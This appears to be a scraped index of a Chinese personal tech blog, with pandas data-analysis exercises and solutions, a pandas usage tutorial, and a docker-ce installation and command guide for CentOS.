3.计算所有产品总收入； 4.计算该数据中产品价格的平均值; 5.程序后台传入产品标题title，要求计算该产品的收入（收入总计）； 6.将总收入、平均价格、产品收入保存到列表里，返回给后台。 题目要求 1.程序传入标题title数据类型是str； 2.程序传出数据类型是列表类型，列表中所有元素的数据类型均是 float； 3.如果产品标题title存在多个，则计算相同title商品的总收入； 4.平均价格需要四舍五入保留小数点后2位。 测试用例 输入：’乐高旗舰店官网大电影系列70837Shimmer&amp;Shine闪亮水疗馆玩具积木’ 输出；[xxx, xxx, 1598.0] 解释：总收入和平均价格隐藏，当前产品收入总计是1598.0 输入：’乐高旗舰店幻影忍者系列70668雷电忍者杰的暴风战机’ 输出：[xxx, xxx, 259073.0] 解释：总收入和平均价格隐藏，当前产品收入总计是259073.0 输入：’乐高旗舰店官网创意百变高手系列10261大型过山车积木成人送礼’ 输出：[xxx, xxx, 41986.0] 数据说明 文本数据是excel文件，字段含义如下： 字段 含义 实例 title 商品名 乐高旗舰店官网 LEGO积木 儿童玩具男孩 积木拼装玩具益智 age_range 商品对应的年龄等级 适用年纪6+岁 price 商品价格 899.0 sales_num 售卖数量 217.0 乐高天猫店销售数据 123456789101112import pandas as pdclass Solution: def task(self, title): df = pd.read_excel(&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/241/fj_lego_tmallshop_sales_data.xlsx&quot;) df[&quot;price&quot;] = df[&quot;price&quot;].dropna() df[&quot;sales_num&quot;] = df[&quot;sales_num&quot;].fillna(0) df[&quot;amount&quot;] = df[&quot;price&quot;] * df[&quot;sales_num&quot;] all = df[&quot;amount&quot;].sum() avg = df[&quot;price&quot;].mean() p = df[df[&quot;title&quot;] == title][&quot;amount&quot;].sum() return [round(all, 2), round(avg, 2), round(p, 2)] 部门平均薪资汇总计算 任务说明 读取给定的职工薪酬考勤簿，职工薪酬考勤簿由两个表格组成，分别是 基本薪资 工作表和 上班通勤 工作表。要求计算每一个部门内部的平均薪资，并把结果 降序 排列，返回给判定程序。 员工个人薪酬计算过程如下： 1.薪资由两部分组成， 月基本薪资 和 通勤工资，另外需要扣除需要缴纳的 社保费及公积金； 2.月基本薪资 = 基本薪资 + 岗位工资 + 绩效工资； 3.通勤工资中计算如下： 日薪 = (基本薪资 + 岗位工资 + 绩效工资) / 应出勤天数 时薪 = 日薪 / 8 4.通勤工资中，法定节假日加班薪资是工作日加班的 2 倍，周末加班工资是工作日加班的 1.5 倍，工作日加班工资与时薪 相同； 5.通勤工资需要扣除因请假导致的缺勤，请假/小时需要扣除的工资按照时薪计算。 6.社保费及公积金个人缴费按照社会保险缴费基数计算： a.养老保险个人缴费比例是 8% b.医疗保险个人缴费比例是 2% c.失业保险个人缴费比例是 1% d.公积金缴费比例是 10% 示例： 小王基本薪资 2000，岗位工资 2000，社会保险缴费基数是 2000。绩效工资 0，应出勤天数 20 天，请假 1 天，工作日加班 8 小时，法定节假日加班 4 小时，周末加班 4 小时。 小王基本薪资+岗位工资+绩效工资是：2000 + 2000 = 4000； 小王时薪：4000 / 20 / 8 = 25； 小王加班工资：25 * 8 + 25 * 4 * 1.5 + 25 * 4 * 2 = 550； 小王请假扣除：25 * 8 = 200； 小王五险一金扣除：2000 * 0.08 + 2000 * 0.02 + 2000 * 0.01 + 2000 * 0.1 = 420； 小王本月实发工资：4000 + 550 - 200 - 420 = 3930。 假设小王所在部门有 5 个人，5 个人工资分别是 4050，4010，4120，4000，4500。小王所在部门的平均工资是：(3930+ 4010 + 4120 + 4000 + 4500) /5 = 4112。同理可算出其他部门的平均工资。 注意：返回结果需四舍五入保留小数点后两位！ 返回结果参数类型是 pd.Series。Series 的索引应为部门名，Series 的数据应为部门平均工资，Series 的 Name 属性应修改为 “平均薪资”。 任务要求 1.程序无需接收参数输入，需要返回结果参数的格式是 pd.Series； 2.返回结果时需要四舍五入保留小数点后两位，计算过程内保留小数点后两位可能导致最后结果不正确； 3.部门平均工资需要降序排列； 4.本题所需的基本薪资表和上班通勤表均在职工薪酬工作簿中，按需读取。 5.Series 数据的类型应为 float 64，Name 属性应为 “平均薪资”。 6.index 的属性名应为部门。 测试用例 部分返回数据： 123456789部门 销售部 15767.86运营部 ****工程部 **** 财务部 **** 研发部 **** 市场部 **** 人力资源部 4233.27 Name: 平均薪资, dtype: float64 附件信息 职工薪酬簿.xlsx，职工薪酬工作簿由 基本薪资 工作表和 上班通勤 工作表组成。 1.基本薪资工作表。基本薪资工作表包含个人所属部门，各部分薪资状况和社会保险缴纳基数。共 7 个部门共 50 条数据，其中只有销售部有绩效工资。 2.上班通勤工作表。上班通勤工作表包含本月应出勤天数，实际出勤天数。请假加班天数等。工作表中的名字与基本薪资工作表中的名字一一对应。共 50 条数据。 职工薪酬工作簿 123456789101112131415161718192021222324252627282930import pandas as pdclass Solution: def department_salary_summary(self) -&gt; pd.Series: basic_df = pd.read_excel(&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/242/fj_employee_salary_work_books.xlsx&quot;, sheet_name=&quot;基本薪资&quot;) commute_df = pd.read_excel(&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/242/fj_employee_salary_work_books.xlsx&quot;, sheet_name=&quot;上班通勤&quot;) basic_df[&quot;月基本薪资&quot;] = basic_df[&quot;基本薪资&quot;] + basic_df[&quot;岗位工资&quot;] + basic_df[&quot;绩效工资&quot;] basic_df[&quot;日薪&quot;] = (basic_df[&quot;月基本薪资&quot;] / commute_df[&quot;应出勤天数（天）&quot;]) basic_df[&quot;时薪&quot;] = basic_df[&quot;日薪&quot;] / 8 commute_df[&quot;法定假日加班（小时）&quot;] = commute_df[&quot;法定假日加班（小时）&quot;].fillna(0) commute_df[&quot;周末加班（小时）&quot;] = commute_df[&quot;周末加班（小时）&quot;].fillna(0) commute_df[&quot;工作日加班（小时）&quot;] = commute_df[&quot;工作日加班（小时）&quot;].fillna(0) basic_df[&quot;加班工资&quot;] = (basic_df[&quot;时薪&quot;] * commute_df[&quot;法定假日加班（小时）&quot;] * 2 + basic_df[&quot;时薪&quot;] * commute_df[&quot;周末加班（小时）&quot;] * 1.5 + basic_df[&quot;时薪&quot;] * commute_df[&quot;工作日加班（小时）&quot;]) commute_df[&quot;请假（小时）&quot;] = commute_df[&quot;请假（小时）&quot;].fillna(0) basic_df[&quot;请假扣除&quot;] = basic_df[&quot;时薪&quot;] * commute_df[&quot;请假（小时）&quot;] basic_df[&quot;五险一金扣除&quot;] = (basic_df[&quot;社会保险缴费基数&quot;] * 0.08 + basic_df[&quot;社会保险缴费基数&quot;] * 0.02 + basic_df[&quot;社会保险缴费基数&quot;] * 0.01 + basic_df[&quot;社会保险缴费基数&quot;] * 0.1) basic_df[&quot;薪资&quot;] = (basic_df[&quot;月基本薪资&quot;] + basic_df[&quot;加班工资&quot;] - basic_df[&quot;请假扣除&quot;] - basic_df[&quot;五险一金扣除&quot;]) df_1 = (basic_df.groupby(&quot;部门&quot;)[&quot;薪资&quot;] .mean() .round(2) .reset_index() .sort_values(by=&quot;薪资&quot;, ascending=False)) series = pd.Series(df_1[&#x27;薪资&#x27;].values, index=df_1[&#x27;部门&#x27;], name=&quot;平均薪资&quot;) return series 编制比较资产负债表 任务描述 “A企业资产负债表.xlsx”文件的“比较资产负债表”包含 A 企业 2020 年和 2021 年的资产负债数据，请完成以下指定任务。 1.使用 0 填充表格中的空值； 2.计算 2021 年各项目变动额和变动率并添加相关数据列； 3.程序接受某项目的项目名称 name，要求输出该项目对应的变动额和变动率。 任务要求 1.代码要编辑在 balance_sheet 函数下； 2.变动额需要四舍五入保留小数点后 2 位，变动率需要四舍五入保留小数点后 4 位； 3.变动额和变动率的数据类型都是浮点数数据类型； 4.程序只判定 return后的结果值，输出（print）后的结果值不作为判断依据； 5.程序返回结果的数据类型为列表。 测试用例 输入：name=“负债总计” 输出：[26928392.51, 0.2567] 解释：负债总计变动额是 26928392.51，变动率是 0.2567 输入：name=“无形资产” 输出：[-600000.0, -0.0667] 解释：无形资产变动额是 -600000.0，变动率是 -0.0667 输入：name=“负债合计” 输出：[26928392.51, 0.2567] 代码提示 我们通过将 Series 转换为列表的形式，将其中的数字提取出来。 通过如下案例，我们取出 DataFrame 中的 1。 1234567891011121314151617181920212223242526In [1]: import pandas as pd# 定义一个 DataFrameIn [2]: df = pd.DataFrame([[1, 2], [3, 4]], columns=[&#x27;A&#x27;, &#x27;B&#x27;])# 预览下 dfIn [3]: dfOut[3]: A B0 1 21 3 4# 通过列名取出 A 列In [4]: df[&#x27;A&#x27;]Out[4]:0 11 3Name: A, dtype: int64# 取出 A 列再将 A 列转换为列表In [5]: df[&#x27;A&#x27;].tolist()Out[5]: [1, 3]# 取出列表中的第一个元素，就是我们想要的 1In [6]: df[&#x27;A&#x27;].tolist()[0]Out[6]: 1 A企业资产负债表 12345678910import pandas as pdclass Solution: def balance_sheet(self, name): compare = pd.read_excel(&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/243/fj_Interprice_balance_data.xlsx&quot;, sheet_name=&quot;比较资产负债表&quot;) compare = compare.fillna(0) compare[&quot;price&quot;] = compare[&quot;2021.12.31&quot;] - compare[&quot;2020.12.31&quot;] compare[&quot;lv&quot;] = compare[&quot;price&quot;] / compare[&quot;2020.12.31&quot;] data = compare[compare[&quot;项目&quot;] == name] return [data[&quot;price&quot;].values.round(2)[0], data[&quot;lv&quot;].values.round(4)[0]] 某店铺不同地区销售情况分析 题目描述 下方是某店铺在 2 月份的订单数据，共 28010 行、7 列。 在该数据中，每一行代表一笔订单，每一笔订单可以 看做是一位顾客（买家），价格相同的产品可视为同一产品； 请编写程序，完成以下任务： 程序传入参数 area（收货地址），要求计算该地区订单的’订单的付款转化率’、’买家全额支付的转化率’、’买家实际支付总金额’、’客单价’、’销量（订单量）最多的产品的价格’、’买家实际支付总金额在所有地区实际支付总金额中的占比’，并将结果以列表形式返回。 题目要求 1.程序接收 str 类型的 area，返回的结果为 list 数据类型； 2.返回的结果中，列表中各个数据的数据类型为 str，其中转化率数据及占比数据需以百分比的形式输出，并且需要保留小数点后2位，如’13.14%’，其余结果不需要以百分比形式输出，但需要保留小数点后2位； 3.如果某地区所有买家的买家实际支付金额为 0，即该地区没有付费行为。则该地区的’客单价’、’销量（订单量）最多的产品的价格’需返回字符串’本地区无销量’，其他结果则正常计算； 4.如果该产品（订单）被全额退款，那么该产品不计入销量。 参考公式 1.付款转化率 = 付款订单数 / 总订单数； 2.买家全额支付的转化率 = 买家全额支付的订单数 / 总订单数； 3.客单价 = 实际支付金额 / 支付买家数； 测试用例 输入：area = ‘河南省’ 输出：[‘81.99%’, ‘61.18%’, ‘56354.03’, ‘92.84’, ‘37.00’, ‘2.96%’] 解释：河南省’订单的付款转化率’为’81.99%’，’买家全额支付的转化率’为’61.18%’，’买家实际支付总金额’为’56354.03’，’客单价’为’92.84’，’销量（订单量）最多的产品的价格’为’37.00’，’买家实际支付总金额在所有地区实际支付总金额中的占比’为’2.96%’ 输入：area = ‘江苏省’ 输出：[‘86.78%’, ‘66.75%’, ‘159359.18’, ‘109.22’, ‘37.00’, ‘8.38%’] 二月销售数据 1234567891011121314151617181920212223242526272829303132333435363738import pandas as pdclass Solution: def task(self, area: str) -&gt; list: source = pd.read_csv(&quot;data/二月销售数据-1.csv&quot;) # 订单的付款转化率 # 付款订单数 fkdds = source[(source[&quot;收货地址&quot;] == area) &amp; (source[&quot;订单付款时间&quot;].notna())].shape[0] # 总订单数 zdds = source[(source[&quot;收货地址&quot;] == area)].shape[0] fkzhl = fkdds / zdds * 100 # 买家全额支付的转化率 # 买家全额支付的订单数 qedds = source[(source[&quot;收货地址&quot;] == area) &amp; (source[&quot;总金额&quot;] == source[&quot;买家实际支付金额&quot;])].shape[0] qezhl = qedds / zdds * 100 # 买家实际支付总金额 sjzfzje = source[(source[&quot;收货地址&quot;] == area)][&quot;买家实际支付金额&quot;].sum() if sjzfzje == 0: kdj = &quot;本地区无销量&quot; zdcpjg = &quot;本地区无销量&quot; else: # 客单价 # 支付买家数 zfmjs = source[(source[&quot;收货地址&quot;] == area) &amp; (source[&quot;买家实际支付金额&quot;] != 0)].shape[0] kdj = sjzfzje / zfmjs # 销量（订单量）最多的产品的价格 zdcpjg = source[(source[&quot;收货地址&quot;] == area)][&quot;总金额&quot;].mode().iloc[0] # 买家实际支付总金额在所有地区实际支付总金额中的占比 sydqzjezb = sjzfzje / source[&quot;买家实际支付金额&quot;].sum() * 100 return [ str(round(fkzhl,2)) + &quot;%&quot; if len(str(round(fkzhl,2)).split(&quot;.&quot;)[1]) == 2 else str(round(fkzhl,2)) + &quot;0%&quot;, str(round(qezhl,2)) + &quot;%&quot; if len(str(round(qezhl,2)).split(&quot;.&quot;)[1]) == 2 else str(round(qezhl,2)) + &quot;0%&quot;, str(round(sjzfzje,2)) if len(str(round(sjzfzje,2)).split(&quot;.&quot;)[1]) == 2 else str(round(sjzfzje,2)) + &quot;0&quot;, str(round(kdj,2)) if len(str(round(kdj,2)).split(&quot;.&quot;)[1]) == 2 else str(round(kdj,2)) + &quot;0&quot;, str(round(zdcpjg,2)) if len(str(round(zdcpjg,2)).split(&quot;.&quot;)[1]) == 2 else str(round(zdcpjg,2)) + &quot;0&quot;, str(round(sydqzjezb,2)) + &quot;%&quot; if len(str(round(sydqzjezb,2)).split(&quot;.&quot;)[1]) == 2 else str(round(sydqzjezb,2)) + &quot;0%&quot; ] 用户职位信息统计 任务详情 请根据任务下方提供的用户职位统计信息表，完成以下任务： 职位表中每个字段含义如下： 字段 说明 user_id 用户序号 age 用户年龄 gender 用户性别 occupation 用户职位 zip_code 用户邮编 编写一个职位统计函数 jobStatistics()，给定表格里的任一职位，统计其以下信息 任务一：统计该职位女性用户的百分占比（结果保留两位小数），输出数据类型为 str； 任务二：统计该职位女性用户百分占比在所有职位女性用户百分占比中的排名（降序），输出数据类型为 int。 将以上2个结果保存在 数组(list) 中，按顺序返回。 任务要求 程序接收一个 str 类型的变量 op，返回一个 list 类型的变量； “gender” 列中，“F” 代表女性，“M” 代表男性； 返回结果格式如下：[任务一: str, 任务二: int]。 测试用例 输入：‘artist’ 输出：[ ‘46.43%’, 4] 解释：该职位中女性用户占据该职位所有用户的46.43%，该职位女性占比排名在所有职位女性占比排名中位列第 4 输入：‘student’ 输出：[‘30.61%’, 10] 解释：该职位中女性用户占据该职位所有用户的30.61%，该职位女性占比排名在所有职位女性占比排名中位列第 10 用户职位信息统计表.xlsx 1234567891011121314151617import pandas as pdclass Solution: def jobStatistics(self, occupation: str) -&gt; list: url = &#x27;http://72.itmc.org.cn:80/JS001/data/user/15960/67/fj_jobstatics.xlsx&#x27; data = pd.read_excel(url) r1 = str(round(len(data[(data[&#x27;gender&#x27;] == &#x27;F&#x27;) &amp; (data[&#x27;occupation&#x27;] == occupation)]) / len( data[(data[&#x27;occupation&#x27;] == occupation)]) * 100, 2)) + &#x27;%&#x27; qbnx = data.groupby(&#x27;occupation&#x27;)[&#x27;user_id&#x27;].size() # 每个部门的女性 bmnx = data[data[&#x27;gender&#x27;] == &#x27;F&#x27;].groupby(&#x27;occupation&#x27;)[&#x27;user_id&#x27;].size() bl = round((bmnx / qbnx) * 100, 2) px = bl.sort_values(ascending=False) pm = int(px.index.get_loc(occupation)) + 1 if len(r1.split(&#x27;%&#x27;)[0].split(&quot;.&quot;)[1]) &lt; 2: r1 = r1.split(&quot;%&quot;)[0] + &quot;0%&quot; return [r1, pm] 某知名网站高质量视频主挖掘 任务详情 根据下方提供的某知名网站视频信息数据，构造一个打分模型，并根据分值挖掘高质量视频主，要求输入视频主的名字author，返回对应的UP主分层。 IFL模型 针对视频主的视频信息构建了IFL模型，以评估视频的质量。 I (Interaction_rate) I 值反映的是平均每个视频的互动率，互动率越高，表明其视频更能产生用户的共鸣，使其有话题感。 I = (总弹幕数 + 总评论数) / (总播放量 * 统计范围内视频数量) * 100。 F (Frequence) F 值表示的是每个视频的平均发布周期，每个视频之间的发布周期越短，说明内容生产者创作视频的时间也就越短，创作时间太长，不是忠实粉丝的用户可能将其遗忘。 F = (统计范围内最晚发布视频时间 - 最早发布视频时间) / 发布视频的数量。 如果 F 的值为 0，表示该视频主仅发布一条视频。那么将 F 的值重新赋值为 F 的最大值 + 1，如原有数据中，F 的最大值是 100，那么就将 F 的最大值设置为 100 + 1 = 101。 L (Like_rate) L值表示的是统计时间内发布视频的平均点赞率，越大表示视频质量越稳定，用户对up主的认可度也就越高。 L = (点赞数 * 1 + 投币数 * 2 + 收藏数 * 3 + 分享数 * 4) / (播放量 * 发布视频数) * 100。 维度打分 维度确认的核心是分值确定，按照设定的标准，我们给每个视频主的 I/F/L 值打分，分值的大小取决于我们的偏好， 即我们越喜欢的行为，打的分数就越高 ： - I 值。表示 up 主视频的平均评论率，这个值越大，就说明其视频越能使用户有话题，当I值越大时，分值越大。 - F 值。表示视频的平均发布周期，我们当然想要经常看到，所以这个值越大时，分值越小。 - L 值。表示发布视频的平均点赞率，S 值越大时，质量越稳定，分值也就越大。 视频主主分层 我们根据每一项指标是否高于平均值，把UP主划分为8类，我们根据案例中的情况进行划分，具体如下表 视频主分类 I值是否大于平均值 F值是否小于平均值 L值是否大于平均值 解释 高质量视频主 1 1 1 用户活跃高，更新周期短，视频质量高 高质量拖更视频主 1 0 1 用户活跃高，更新周期长，视频质量高 高质量内容高深视频主 0 1 1 用户活跃低，更新周期短，视频质量高 高质量内容高深拖更视频主 0 0 1 用户活跃低，更新周期长，视频质量高 接地气活跃视频主 1 1 0 用户活跃高，更新周期短，视频质量低 活跃视频主 0 1 0 用户活跃低，更新周期短，视频质量低 接地气视频主 1 0 0 用户活跃高，更新周期长，视频质量低 还在成长的视频主 0 0 0 用户活跃低，更新周期长，视频质量低 数据链接已经在下方给出： 各字段表示含义如下： 字段名 含义 pubdate 发布时间 bv BV号 url 视频链接 title 标题 author 作者 description 视频简介 tag 标签 favorites 收藏 coins 投币 danmu 弹幕 likes 点赞 reply 评论 views 播放量 share 分享 任务要求 程序接收 str 类型的变量 author，返回结果的数据类型是str类型； 便于数据美观，IFL 的值需要保留小数点后两位（四舍五入）； 数据中可能存在重复数据； 某知名视频网站视频数据为逗号分割的 csv 文件，utf-8 编码。 测试用例 输入：‘龙爪洪荒’ 输出：‘高质量拖更视频主’ 输入：‘AO摆渡人’ 输出：‘活跃视频主’ 某知名视频网站视频数据.csv 1代码暂无","categories":[{"name":"Python","slug":"Python","permalink":"https://bestflyteng.github.io/categories/Python/"}],"tags":[{"name":"Pandas","slug":"Pandas","permalink":"https://bestflyteng.github.io/tags/Pandas/"},{"name":"Python","slug":"Python","permalink":"https://bestflyteng.github.io/tags/Python/"}]},{"title":"Pandas 库的使用","slug":"202408240914","date":"2024-08-24T01:14:00.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/1701cff7/","permalink":"https://bestflyteng.github.io/posts/1701cff7/","excerpt":"","text":"本文按照pandas文档来总结的，如果有错误的地方，欢迎指正 https://pandas.ac.cn/docs/ 安装 pandas 1pip install pandas 导入 pandas 1import pandas as pd 读取表格或数据库 数据库以MySQL为例 支持相对路径，绝对路径，网络路径 读取操作返回DataFrame 12345678910111213141516171819202122232425import pandas as pdimport pymysql# 在读取的时候添加parse_dates=[&quot;列名&quot;]，可使这个列变为Timestamp类型# 读取csv表格文件pd.read_csv(&quot;data.csv&quot;)# 读取xlsx或者xls表格文件pd.read_excel(&quot;data.xlsx&quot;)# 读取MySQL# 首先创建数据库连接对象conn = pymysql.connect( host=&quot;localhost&quot;, # 数据库地址 port=3306, # 数据库端口 user=&quot;root&quot;, # 登录用户名 password=&quot;123456&quot;, # 登录密码 database=&quot;example&quot;, # 数据库名称 charset=&quot;utf8&quot; # 编码格式)#执行sql操作# %s 是占位符, index_col 是索引字段,可以是字符串也可以是列表sql = &quot;select * from user limit %s,%s&quot;pd.read_sql(sql,con=conn,params=[10,20],index_col=[&quot;id&quot;,&quot;type&quot;]) 写入表格 12345678910111213# 写 csv 文件import pandas as pd# 读取read.csv表格data_read = pd.read_csv(&quot;read.csv&quot;)# 将read.csv表格写入到write.csv表格,并去除索引,在写入时不能打开write.csvdata_read.to_csv(&quot;write.csv&quot;,index=False) # 将read.csv表格写入到write.txt文件里，并设置分割方式，去除索引,在写入时不能打开write.txtdata_read.to_csv(&quot;write.txt&quot;,sep=&quot;\\t&quot;,index=False)# 将read.csv表格写入到write.xlsx表格,并去除索引,在写入时不能打开write.xlsxdata_read.to_excel(&quot;write.xlsx&quot;,index=False) 选择 DataFrame 的子集 12import pandas as pddata = pd.read_csv(&quot;data.csv&quot;) 选择数值列 1data.describe() 选择特定列 1234567# 选择Age列ages = data[&quot;Age&quot;]ages.head()# 选择Name列和Age列name_age = data[[&quot;Name&quot;,&quot;Age&quot;]]name_age.head() 选择特定行 12345678910111213141516# 筛选年龄超过35岁的乘客# data[&quot;Age&quot;] &gt; 35 将判断每一条数据的Age字段是否大于35ages = data[data[&quot;Age&quot;] &gt; 35]ages.head()# 筛选泰坦尼克号 2 等舱和 3 等舱的乘客# 第一种写法class_23 = data[data[&quot;class&quot;].isin([2,3])]# 第二种写法# 注: 不能用 or/and,需要用or运算符 | 和and运算符 &amp;class_23 = data[(data[&quot;class&quot;] == 2) | (data[&quot;class&quot;] == 3)]class_23.head()# 获取已知年龄的乘客数据ages_no_na = data[data[&quot;Age&quot;].notna()]ages_no_na.head() 选择特定的行和列 需要在选择括号 [] 前面使用 loc/iloc 运算符。使用 loc/iloc 时，逗号前面的部分是要选择的行，逗号后面的部分是要选择的列 loc是基于行标签和列标签进行索引的，基本用法为 DataFrame.loc[行标签,列标签] iloc是基于行和列的位置进行索引的，索引从0开始，基本用法为 DataFrame.iloc[行位置,列位置] 1234567# 年龄大于35岁的乘客的姓名names = data.loc[data[&quot;Age&quot;] &gt; 35,&quot;Name&quot;]names.head()# 获取第十行到30行的数据datas = data.iloc[9,30]datas.head() 从现有列创建新列 12345import pandas as pddata = pd.read_csv(&quot;data.csv&quot;)# 创建Age2列，值为Age列的2倍data[&#x27;Age2&#x27;] = data[&#x27;Age&#x27;] * 2 修改列名称 12345678910111213import pandas as pddata = pd.read_csv(&quot;data.csv&quot;)data.rename( columns=&#123; &quot;现有列名称&quot;:&quot;新名称&quot;, &quot;Age&quot;:&quot;年龄&quot;, &quot;name&quot;:&quot;姓名&quot; &#125;)# 也可以映射data.rename(columns=str.lower) 计算汇总统计量 12import pandas as pddata = pd.read_csv(&quot;data.csv&quot;) 平均值 1data[&quot;Age&quot;].mean() 中位数 1data[&quot;Price&quot;].median() 特定组合 123456data.agg( &#123; &quot;Age&quot;: [&quot;min&quot;,&quot;max&quot;,&quot;median&quot;,&quot;skew&quot;], &quot;Fare&quot;: [&quot;min&quot;,&quot;max&quot;,&quot;median&quot;,&quot;mean&quot;] &#125;) 按类别分组的汇总统计量 1、男性和女性泰坦尼克号乘客的平均年龄是多少？ 12345678# 先查询出Sex字段和Age字段的数据，然后将数据根据Sex分组，最后求年龄的平均值data[[&#x27;Sex&#x27;,&#x27;Age&#x27;]].groupby(&quot;Sex&quot;).mean()# 如果没有显式的选择Sex和Age两列，那么就需要使用numeric_only=True应用包含数值列的每一项data.groupby(&quot;Sex&quot;).mean(numeric_only=True)# 也可以对分组数据的列选择data.groupby(&quot;Sex&quot;)[&#x27;Age&#x27;].mean() 2、每个性别和客舱等级组合的平均票价是多少？ 1data.groupby([&quot;Sex&quot;,&quot;Pclass&quot;])[&#x27;Fare&#x27;].mean() 按类别统计记录数 1、每个客舱等级有多少乘客？ 1234567# value_counts是一个快捷方式，它实际上是分组操作与每个组内记录数的计数相结合# 两个相同data[&#x27;Pclass&#x27;].value_counts()data.groupby(&quot;Pclass&quot;)[&#x27;Pclass&#x27;].count()# size 和 count 都可以与 groupby 结合使用。而 size 包含 NaN 值，只提供行数（表格的大小），count 排除缺失值。在 value_counts 方法中，使用 dropna 参数来包含或排除 NaN 值。data.groupby(&quot;Pclass&quot;)[&#x27;Pclass&#x27;].size() 排序 12345678910# 根据Age进行排序# 基本用法: sort_values(by,axis,ascending,inplace,kind,na_position)# by: 根据哪一列排序,可以为一个列表# axis: 轴来指导排序# ascending: 如果为真，按升序排序，否则按降序排序# inplace: 如果为真，就地执行操作# kind: 选择排序算法# na_position: 参数&#x27;first&#x27;将NaNs放在开头，&#x27;last&#x27;将NaNs放在结尾titanic.sort_values(by=&quot;Age&quot;).head()# sort_index和sort_value基本相似,只是一个按索引排序，一个按字段排序 数据重塑 1234567# pivot(data,columns,index,values)# data: 数据帧# columns: str | object | str列表，用于创建新框架的列的列# index: str | object | str列表，可选，用于创建新帧索引的Column，如果未给出，则使用现有索引# values: str、对象或上一个列表，可选，用于填充新帧值的列，如果不指定，则将使用所有剩余列，结果将具有分层索引列# 返回重塑的DataFramedata.pivot() 透视表 在 pivot() 的情况下，数据只是重新排列。当需要聚合多个值时，可以使用 pivot_table()，它提供一个聚合函数（例如平均值）来组合这些值。 1data.pivot_table(values=&quot;value&quot;, index=&quot;location&quot;, columns=&quot;parameter&quot;, aggfunc=&quot;mean&quot;) 创建新索引 reset_index() 1data.pivot(columns=&quot;location&quot;, values=&quot;value&quot;).reset_index() 合并 123data1 = pd.read_csv(&quot;data1.csv&quot;)data2 = pd.read_csv(&quot;data2.csv&quot;)pd.concat([data1,data2],axis=0) merge 基本用法: merge(left,right,how,on,left_on,right_on,left_index,right_index,sort,suffixes,copy,indicator,validate) 详细解释见: https://pandas.pydata.org/docs/reference/api/pandas.merge.html#pandas.merge 时间序列数据 1pd.to_datetime(data[&quot;datetime&quot;]) 操作文本 12345678910111213141516171819202122# 将Name字段的所有内容全部转为小写data[&#x27;Name&#x27;].str.lower# 分割Name字段的所有内容data[&#x27;Name&#x27;].str.split(&quot;,&quot;)# 基本用法: contains(pat,case,flags,na,regex)# pat: 字符串或正则# case: 是否区分大小写，默认True# flags: 默认0，传递给 re 模块的标志，例如 re.IGNORECASE 的 CASE。# na: 可选,默认对空值不处理，即输出结果还是nan# 文本包含,是否包含Countess字符串，包含返回True，不包含返回False，NaN返回NaNdata[&#x27;Name&#x27;].str.contains(&quot;Countess&quot;)# 获取Name长度data[&#x27;Name&#x27;].str.len()# 获取名字最长的那一个Namedata.loc[data[&#x27;Name&#x27;].str.idxmax(),&quot;Name&quot;]# 替换，将“male”的值替换为“M”，将“female”的值替换为“F”。data[&#x27;Name&#x27;].replace(&#123;&quot;male&quot;: &quot;M&quot;, &quot;female&quot;: &quot;F&quot;&#125;)","categories":[{"name":"python","slug":"python","permalink":"https://bestflyteng.github.io/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://bestflyteng.github.io/tags/python/"},{"name":"pandas","slug":"pandas","permalink":"https://bestflyteng.github.io/tags/pandas/"}]},{"title":"安装并使用 docker-ce","slug":"202408191233","date":"2024-08-19T04:33:11.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/be729bfc/","permalink":"https://bestflyteng.github.io/posts/be729bfc/","excerpt":"","text":"下载 从阿里云下载 docker-ce 仓库，并将仓库文件移动到 /etc/yum.repos.d/ 目录下 12sudo curl -O https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.reposudo mv docker-ce.repo /etc/yum.repos.d/ 刷新yum缓存 12sudo yum clean allsudo yum makecache fast 查看 docker-ce 源是否添加成功 1yum list docker-ce 安装 安装 docker-ce 1sudo yum install docker-ce -y 执行命令查看是否安装成功 1docker info 如果出现这种错误，说明没有运行 docker 的启动与停止 12345678910111213# 启动 dockerservice docker start# 守护进程重启systemctl daemon-reload# 重启 docker 服务(二选其一即可)systemctl restart dockerservice docker restart# 关闭 docker (二选其一即可)systemctl stop dockerservice docker stop 常用docker命令 查看镜像 1docker images 搜索镜像 1docker search 镜像名称 拉取镜像 1docker pull 镜像名称 按镜像id删除镜像 1docker rmi 镜像id 删除所有镜像 1docker rmi $(docker images -q) 查看正在运行的容器 1docker ps 查看所有容器 1docker ps -a 查看最后一次运行的容器 1docker ps -l 查看停止的容器 1docker ps -f status=exited 创建容器 12345678910111213docker run -i：表示运行容器 -t：表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即分配一个伪终端。交互式 --name :为创建的容器命名。 -v：表示目录映射关系（前者是宿主机目录，后者是映射到宿主机上的目录），可以使用多个－v做多个目录或文件映射。注意：最好做目录映射，在宿主机上做修改，然后共享到容器上。 -d：在run后面加上-d参数,则会创建一个守护式容器在后台运行（这样创建容器后不会自动登录容器，如果只加-i -t两个参数，创建后就会自动进去容器）。 -p：表示端口映射，前者是宿主机端口，后者是容器内的映射端口。可以使用多个-p做多个端口映射 创建并进入容器，退出停止(交互式) 1docker run -it --name=容器名称 镜像名称:标签 /bin/bash 退出当前容器 1exit 守护式创建容器 创建但不登陆 1docker run -di --name=容器名称 镜像名称:标签 创建并登陆 1docker exec -it 容器名称(或者容器id) /bin/bash 停止与启动容器 停止容器 1docker stop 容器名称(或者容器id) 启动容器 1docker start 容器名称(或者容器id) 文件拷贝 将文件拷贝到容器内 1docker cp 需要拷贝的文件或目录 容器名称:容器目录 将文件从容器内拷贝出来 1docker cp 容器名称:容器目录 需要拷贝的文件或目录 目录挂载 在创建容器的时候，将宿主机的目录与容器内的目录进行映射，这样就可以通过修改宿主机某个目录的文件从而去影响容器。创建容器添加-v参数 后边为 宿主机目录:容器目录，例如： 1docker run -di -v /usr/local/myhtml:/usr/local/myhtml --name=mycentos centos:7 迁移与备份 将容器保存为镜像 1docker commit 容器名称 镜像名称 将镜像保存为 tar 文件 1docker save -o image.tar 镜像名称 恢复镜像 12# 恢复之前先删除原有的镜像docker load -i image.tar 私有仓库搭建与配置 拉取私有仓库镜像 1docker pull registry 启动私有仓库容器 1docker run -di --name=registry -p 5000:5000 registry 